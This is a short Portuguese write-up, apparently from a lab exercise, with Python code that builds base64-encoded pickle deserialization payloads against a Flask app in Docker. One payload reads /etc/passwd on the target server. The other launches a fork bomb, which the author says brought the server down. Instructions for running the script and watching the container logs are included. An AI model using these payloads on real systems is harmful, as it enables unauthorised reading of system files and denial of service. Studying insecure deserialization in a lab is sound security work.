abaixo o conteudo python de cada um dos payloads um deles e o fork bomb que funciona como um DoS o que fez com que a gente conseguisse derrubar o servidor  
para executar devemos executar este script python com python3 payload.py logo sera gerada dois codigos serializados em base64 e devemos escolher se queremos  que printa no site ou no servidor docker 

para uar o do servidor docker apos executar o comando no site usamos 

docker ps 

pegamos o nome do docker neste caso pro_01-flask_app-1
 
docker logs -f pro_01-flask_app-1

class Evil:
    def __reduce__(self):
        # esse comando lê o /etc/passwd
        return (subprocess.check_output, (["cat", "/etc/passwd"],))

payload = pickle.dumps(Evil())
print("show in website " +  base64.urlsafe_b64encode(payload).decode())

# este abaixo e um fork bomb o objetivo e criar inumeros sub processos no servidor alvo

class TERM:
    def __reduce__(self):
        return (os.system, ("bomb(){ bomb|bomb& };bomb",))

second_payload = pickle.dumps(TERM())
print("show in terminal " + base64.urlsafe_b64encode(second_payload).decode())
